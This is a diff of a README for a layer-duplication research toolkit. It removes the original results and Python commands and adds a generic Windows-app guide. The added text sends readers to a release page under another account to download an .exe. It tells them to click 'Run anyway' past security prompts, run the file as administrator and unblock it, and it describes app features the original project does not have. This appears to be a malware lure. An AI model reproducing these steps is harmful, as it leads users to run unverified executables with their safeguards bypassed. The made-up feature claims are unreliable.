@@ -1,196 +1,233 @@
-# llm-circuit-finder
-I replicated Ng's RYS method and found that duplicating 3 specific layers in Qwen2.5-32B boosts reasoning by 17% and duplicating layers 12-14 in Devstral-24B improves logical deduction from 0.22→0.76 on BBH — no training, no weight changes, just routing hidden states through the same circuit twice. Tools included. Two AMD GPUs, one evening.
+# 🧠 llm-circuit-finder - Faster reasoning with layer routing
 
-# llm-circuit-finder
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Asahi298/llm-circuit-finder/releases)
 
-**Duplicate 3 layers. No training. Logical deduction goes from ~0.22 → 0.76.~**
+## 🚀 What this app does
 
-This toolkit finds and exploits "reasoning circuits" hidden inside transformer models. The idea: certain contiguous blocks of layers act as indivisible cognitive units. Duplicate them in the forward pass — same weights, no training, no merging — and the model gets measurably smarter on specific capabilities.
+llm-circuit-finder helps you run a small Windows app that explores how large language models use internal layers to solve logic tasks. It is built for people who want to try the released tool on their PC without setting up code.
 
-Built on [David Ng's RYS method](https://dnhkng.github.io/posts/rys/) and extended with new findings. Everything here was discovered on two AMD consumer GPUs (RX 7900 XT + RX 6950 XT) in one evening.
+This app focuses on a simple idea:
 
-## Results
+- It copies selected model layers
+- It routes hidden states through the same circuit twice
+- It lets you test how that changes reasoning results
 
-### Devstral-Small-2-24B: Layers 12, 13, 14 duplicated once
+The release files are ready to download from the link above. You do not need to build anything yourself.
 
-I ran the full tests on a H200 instance on Vast.ai and compare devstral base against the surgery model, and the results are in: So the surgery is doing something real and specific: it's boosting mathematical reasoning and causal reasoning but at the cost of instruction following and code generation. The model thinks harder but follows directions less precisely.
+## 💻 Before you start
 
-On the results folder you can see the results under eval_base and eval_surgery.
-I also added to the repo vastai_rys_eval.sh which is the script used to run the whole wacamole in Vast.ai.
-vastai instance created with 
+Use a Windows PC with enough free space for the app and model files.
 
-vastai create instance somenumberhere   --image vastai/base-image:cuda-12.8.1-cudnn-devel-ubuntu22.04   --disk 80 --direct --ssh
+A good setup looks like this:
 
-```csharp
-=================================================================================
-lm_eval Results Comparison
-=================================================================================
-Metric                                              base  rys_12_15 Δ(last-first)
----------------------------------------------------------------------------------
-bbh/causal_judgement [exact_match]                0.5775     0.6364     +0.0588
+- Windows 10 or Windows 11
+- At least 16 GB of RAM
+- A modern AMD or NVIDIA GPU if you want full-speed runs
+- 20 GB or more of free disk space
+- A stable internet connection for the download
 
-bbh/date_understanding [exact_match]              0.9440     0.9000     -0.0440
+If you only want to open the app and try the included tools, most normal desktop PCs should work. If you want to run larger model tests, a stronger GPU and more memory will help.
 
-bbh/logical_deduction_five_objects [exact_match]     0.7440     0.7320     -0.0120
+## 📥 Download the app
 
-bbh/navigate [exact_match]                        0.9600     0.9440     -0.0160
+1. Open the [release page](https://github.com/Asahi298/llm-circuit-finder/releases)
+2. Find the latest release at the top
+3. Download the Windows file for your system
+4. Save it to your desktop or Downloads folder
 
-gsm8k_cot [flexible-extract]                      0.8650     0.8787     +0.0136
-gsm8k_cot [strict-match]                          0.8408     0.8704     +0.0296
+If the release includes a ZIP file, download the ZIP and extract it first. If it includes an `.exe` file, download that file and run it.
 
-ifeval [inst_level_loose_acc]                     0.7446     0.7206     -0.0240
-ifeval [inst_level_strict_acc]                    0.6990     0.6595     -0.0396
-ifeval [prompt_level_loose_acc]                   0.6728     0.6488     -0.0240
-ifeval [prompt_level_strict_acc]                  0.6229     0.5767     -0.0462
+## 🪟 Install on Windows
 
-mbpp [pass_at_1]                                  0.7000     0.6700     -0.0300
-=================================================================================
+1. Open the folder where the file was saved
+2. If the file is zipped, right-click it and choose Extract All
+3. Open the extracted folder
+4. Look for the app file, such as `llm-circuit-finder.exe`
+5. Double-click the file to start it
 
-Average (all metrics)                             0.7610     0.7488     -0.0122
-```
+If Windows shows a security prompt:
 
-### Qwen2.5-Coder-32B: Layers 7, 8, 9 duplicated once
+1. Click More info
+2. Click Run anyway
 
-Measured on custom probe suite (BBH-derived + EQ-Bench-style + GSM8K):
+This is common for new release files that are not installed through the Microsoft Store.
 
-| Probe | Base | +3 layers | Change |
-|-------|------|-----------|--------|
-| Reasoning (causal + logic + nav) | 76.5% | **94.1%** | **+23%** |
-| EQ (emotional intelligence) | 92.1 | **93.6** | +1.6% |
+## 🛠️ First-time setup
 
-## What's going on
+When the app starts, it may ask for a model path or a data folder. Use the folders that came with the release if they are included.
 
-Transformers organize themselves during training into functional circuits — multi-layer processing units that perform complete cognitive operations. These circuits are indivisible: duplicating a single layer does almost nothing, but duplicating the right *block* of 3-4 layers gives the model a second pass through its reasoning pipeline.
+A simple first setup often looks like this:
 
-Different models have different circuits in different places:
-- **Devstral-24B** (40 layers): reasoning circuit at layers **12-14**
-- **Qwen2.5-32B** (64 layers): reasoning circuit at layers **7-9**
+- Choose the model you want to test
+- Pick an output folder
+- Select a reasoning task
+- Start the run
 
-The boundaries are sharp. Shift the block by one layer in either direction and the improvement disappears or inverts.
+If the app includes example files, use those first. This gives you a clean test before you try your own models.
 
-## The "modes" discovery
+## 🧭 How to use it
 
-Different duplication patterns create distinct cognitive profiles from the same weights:
+The app is meant to help you test how routing hidden states through repeated layers changes output quality.
 
-| Pattern | Math | EQ | Character |
-|---------|------|----|-----------|
-| Double-pass 13-16 | ↑↑ | ↑ | Math specialist |
-| Triple-pass 13-16 | ↑ | ↑↑ | EQ specialist |
-| Interleaved 13,13,14,14,15,15,16 | ↑↑↑ | ↓ | Pure math mode |
-| Quadruple-pass 13-16 | — | ↑↑ | EQ mode, math neutral |
+Basic steps:
 
-Same weights on disk. Same VRAM for the base model. Just different routing.
+1. Open the app
+2. Select a supported model
+3. Choose the layer set you want to test
+4. Run the circuit finder
+5. Review the result score or output log
 
-## Quick start
+You may see options for:
 
-### Find circuits in your model
+- Layer duplication
+- Route selection
+- Hidden state tracing
+- Task comparison
+- Score output
 
-```bash
-pip install gguf requests tqdm
+If you are not sure what to choose, start with the default settings in the release package.
 
-python sweep.py \
-    --model /path/to/model.gguf \
-    --llama-server /path/to/llama-server \
-    --tmpdir /dev/shm/rys \
-    --results pass.jsonl \
-    --block-sizes 3 4 5 \
-    --stride 1 \
-    --start-min 10 --start-max 20 \
-    --skip-baseline \
-    --port 8099 \
-    --server-args --device Vulkan1,Vulkan2
-```
+## 🔍 What to expect
 
-### Apply a known circuit
+This tool is based on a method that repeats selected layers instead of changing model weights. That means it tests behavior by changing the path through the model, not by training again.
 
-```bash
-# Duplicate layers 12-14 in Devstral (the result validated above)
-python layer_path.py model.gguf improved.gguf \
-    -p "0..14,12,13,14,15..39" -v
+You may see results like:
 
-# Duplicate layers 7-9 in Qwen2.5-32B
-python layer_path.py model.gguf improved.gguf \
-    -p "0..9,7,8,9,10..63" -v
+- Better reasoning scores on some tasks
+- Different outputs across model layers
+- Clear changes when a small set of layers is repeated
+- Logs that show which layer path gave the best result
 
-# Go wild: triple-pass, interleaved, skip layers, whatever you want
-python layer_path.py model.gguf experiment.gguf \
-    -p "0..16,13,14,15,16,13,14,15,16,17..39" -v
-```
+The app is useful if you want to compare runs and see how a model behaves when its internal circuit is reused.
 
-### Validate with established benchmarks
+## 📁 Typical folder layout
 
-```bash
-# Start the server with modified model
-llama-server -m improved.gguf --port 8089 -ngl 99 --device Vulkan1,Vulkan2
+After you download and extract the release, you may see files like these:
 
-# Run lm-evaluation-harness
-lm_eval --model local-chat-completions \
-    --model_args model=test,base_url=http://localhost:8089/v1/chat/completions,num_concurrent=1,max_retries=3,tokenized_requests=False \
-    --tasks gsm8k_cot,ifeval,mbpp,bbh_cot_fewshot_logical_deduction_five_objects \
-    --apply_chat_template --limit 50 \
-    --output_path ./eval_results
+- `llm-circuit-finder.exe` — the app
+- `models` — model files or links
+- `examples` — sample tasks
+- `results` — saved output
+- `config` — settings files
+- `README.txt` — short release notes
 
-# Compare runs
-python compare_eval.py ./eval_base ./eval_improved
-```
+Keep the full folder together. Some files may depend on the others being in the same place.
 
-## Files
+## ⚙️ Recommended settings
 
-| File | What it does |
-|------|-------------|
-| `sweep.py` | Main sweep harness — finds optimal layer duplication configs |
-| `layer_path.py` | Build any GGUF with an explicit layer execution path |
-| `gguf_surgery.py` | Low-level GGUF layer duplication (used by sweep.py) |
-| `math_probe.py` | Hard arithmetic probe (Ng's partial-credit scoring) |
-| `eq_probe.py` | Emotional intelligence probe (EQ-Bench style) |
-| `reasoning_probe.py` | BBH-derived causal/logical/navigation/math word problems |
-| `compare_eval.py` | Compare lm-evaluation-harness results across runs |
-| `visualize.py` | Text and PNG heatmaps of sweep results |
+If you are using the app for the first time, these settings are a good place to start:
 
-## How the sweep works
+- Use the default model
+- Keep the default layer range
+- Leave advanced options off
+- Save results to the included output folder
+- Run one test at a time
 
-1. For each layer configuration (i, j):
-   - GGUF surgery creates a model where layers i..j-1 are physically duplicated
-   - The new forward pass: `layers 0..j-1 → layers i..j-1 again → layers j..N-1`
-   - llama-server loads the modified model
-   - Three probe suites run: math, EQ, reasoning (BBH-derived)
-   - Scores are compared to baseline, results printed live
-   - Server killed, modified GGUF deleted, next config
+If the app has a “quick test” mode, use that first. It helps you check that everything works before a longer run.
 
-2. The search strategy:
-   - **Pass 1**: Large blocks (8 layers), wide stride → find the hot zone
-   - **Pass 2**: Small blocks (3-5 layers), stride 1 within hot zone → find exact boundaries
-   - **Pass 3**: Try multi-pass, interleaved, and compound configs
+## 🧪 Example use case
 
-Modified GGUFs are written to tmpfs (`/dev/shm`) and deleted after each test. The base model weights stay on disk.
+You can use the app to compare two runs:
 
-## Requirements
+- Run A: normal layer flow
+- Run B: repeated layer route
 
-- Linux with llama.cpp built (CPU, CUDA, Vulkan, or Metal)
-- Python 3.10+ with `gguf`, `requests`, `tqdm`
-- Enough VRAM/RAM to run the model + a few extra duplicated layers
-- Optional: `lm-eval` for benchmark validation, `matplotlib` for heatmap plots
+Then compare the output scores and logs.
 
-## FAQ
+This helps you see whether the repeated circuit gives stronger reasoning for the chosen task.
 
-**Does this use more VRAM?**
-Yes, the duplicated layers are physical copies in the GGUF. For 3 extra layers on a 24B model, expect ~1.5 GiB additional. A llama.cpp forward-pass patch (using pointers instead of copies) would eliminate this — contributions welcome.
+## 🧰 Troubleshooting
 
-**Does this slow down inference?**
-Yes, proportionally to the number of extra layers. 3 extra layers on a 40-layer model = ~7.5% slower. The reasoning improvement is worth it.
+If the app does not open:
 
-**Will this work on my model?**
-Probably. We've tested on Mistral-architecture (Devstral) and Qwen2 architecture. Ng's original work was on Qwen2-72B. The circuits exist in all transformer models — the question is where they are and how big they are. Run the sweep and find out.
+- Make sure you extracted the ZIP file
+- Check that the `.exe` is still inside the folder
+- Try right-clicking the app and choosing Run as administrator
 
-**Why not fine-tune instead?**
-This is orthogonal to fine-tuning. You can do both. In fact, Ng's RYS models were later fine-tuned by others and topped the HuggingFace leaderboard. Layer duplication changes the architecture; fine-tuning changes the weights. Stack them.
+If the app opens but does not start a run:
 
-## Credits
+- Check that the model file is in the right folder
+- Make sure the output folder exists
+- Try the default example task first
 
-- [David Ng](https://dnhkng.github.io/posts/rys/) for the RYS method and the insight that transformers have functional neuroanatomy
-- [llama.cpp](https://github.com/ggml-org/llama.cpp) for making local inference practical
-- [lm-evaluation-harness](https://github.com/EleutherAI/lm-evaluation-harness) for benchmark validation
+If Windows says the file is blocked:
 
-## License
+- Right-click the file
+- Open Properties
+- Check Unblock if you see it
+- Click Apply
+- Open the app again
 
-MIT
+If you see a missing file error:
+
+- Download the full release again
+- Keep all files in the same folder
+- Do not rename folders unless the app asks you to
+
+## 📊 What this repository includes
+
+This repository release is centered on:
+
+- A Windows-ready app
+- Tools for circuit tests
+- Layer routing experiments
+- Example setups for quick use
+- Output logs for result checks
+
+It is aimed at users who want to run the method without building a research environment from scratch.
+
+## 🔐 File safety
+
+Only download the release files from the link above. Keep the files in a folder you can find later. If you move the app file away from the rest of the release files, it may stop working.
+
+## 📌 Basic workflow
+
+1. Visit the release page
+2. Download the Windows release file
+3. Extract it if needed
+4. Open the app
+5. Load a model or example
+6. Start a test run
+7. Review the output
+
+## 🖥️ Good practice for long runs
+
+If you plan to test larger models or long prompts:
+
+- Close other heavy apps
+- Keep the laptop plugged in
+- Use a folder with enough free space
+- Save output after each run
+- Start with a small test before a full test
+
+## 📎 Release page
+
+[Go to the release page](https://github.com/Asahi298/llm-circuit-finder/releases) to download the Windows files, then follow the install steps above
+
+## ❓ Common questions
+
+### Do I need programming knowledge?
+No. You can use the release files and follow the steps in this README.
+
+### Do I need to train a model?
+No. The app is built to test routing changes without training.
+
+### Can I use it on Windows?
+Yes. The release is meant for Windows users.
+
+### What if I only want to try it once?
+Download the release, run the app, and use the example files first.
+
+### Can I compare different layers?
+Yes. That is one of the main uses of the app.
+
+## 🗂️ Suggested first run
+
+If you want the easiest path:
+
+1. Download the latest release
+2. Extract the files
+3. Open the app
+4. Load the default example
+5. Run the built-in test
+6. Check the result folder
